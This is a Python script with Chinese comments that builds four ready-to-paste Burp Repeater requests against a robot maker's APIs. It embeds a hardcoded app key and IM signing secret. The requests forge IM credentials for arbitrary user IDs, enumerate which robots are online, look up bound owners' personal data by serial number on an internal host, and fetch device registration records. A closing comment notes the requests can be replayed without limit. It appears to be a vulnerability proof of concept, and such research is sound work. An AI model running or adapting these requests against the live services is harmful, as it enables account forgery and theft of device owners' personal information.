# -*- coding: utf-8 -*-
# burp_gen_request.py — 生成四段可直接粘贴进 Burp Repeater 的 raw HTTP
# 用法: python burp_gen_request.py [--sn SN] [--uid userId]
import argparse, hashlib, time, uuid

APP_ID = '100020114'
APP_KEY = 'b4e01f307c614ded9f7ac59cf9960874'
DEVICE_ID = 'sigvoidprobe0001'


def im_sig(t_ms):
    return hashlib.md5(('IM$SeCrET' + t_ms).encode()).hexdigest()


def ubt_sign(device_id):
    ts = str(int(time.time()))
    nonce = uuid.uuid4().hex[:8]
    s = hashlib.md5((ts + APP_KEY + nonce + device_id).encode()).hexdigest()
    return f"{s} {ts} {nonce} v2"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--sn', default='<其他机器人设备_01>', help='目标机器人 SN（仅用自有设备）')
    ap.add_argument('--uid', default='sigvoid_probe_nonexist_9x7z', help='要伪造 userSig 的 userId')
    a = ap.parse_args()

    t = str(int(time.time() * 1000))
    sig = im_sig(t)
    xsign = ubt_sign(DEVICE_ID)

    print('=' * 70)
    print('# 1) 伪造任意账号 IM 凭据  ->  apis.ubtrobot.com:443 (HTTPS)')
    print('=' * 70)
    print(f"""GET /im/getInfo?signature={sig}&time={t}&userId={a.uid}&channel=MINIEDUCN HTTP/1.1
Host: apis.ubtrobot.com
Connection: close

""")

    print('=' * 70)
    print('# 2) 在线状态枚举  ->  apis.ubtrobot.com:443 (HTTPS)')
    print('=' * 70)
    accs = f'{a.sn},<其他机器人设备_01>,<其他机器人设备_01>'
    print(f"""GET /im/isOnline?signature={sig}&time={t}&userId={a.uid}&accounts={accs}&channel=MINIEDUCN HTTP/1.1
Host: apis.ubtrobot.com
Connection: close

""")

    print('=' * 70)
    print('# 3) SN -> 机主 PII  ->  internal.ubtrobot.com:443 (HTTPS)')
    print('=' * 70)
    print(f"""GET /v1/minieducn/relation/getBindUsers?robotUserId={a.sn} HTTP/1.1
Host: internal.ubtrobot.com
X-UBT-AppId: {APP_ID}
X-UBT-DeviceId: {DEVICE_ID}
X-UBT-Sign: {xsign}
Connection: close

""")

    print('=' * 70)
    print('# 4) SN -> 设备注册信息  ->  prodapi.ubtrobot.com:443 (HTTPS)')
    print('=' * 70)
    body = f'{{"serialNum":"{a.sn}"}}'
    print(f"""POST /equipment/equipment/listBySerialNum HTTP/1.1
Host: prodapi.ubtrobot.com
X-UBT-AppId: {APP_ID}
X-UBT-DeviceId: {DEVICE_ID}
X-UBT-Sign: {xsign}
Content-Type: application/json
Content-Length: {len(body)}
Connection: close

{body}
""")
    print('# 提示：服务端不校验时间戳窗口（24h 已验证），以上请求可无限重放。')


if __name__ == '__main__':
    main()
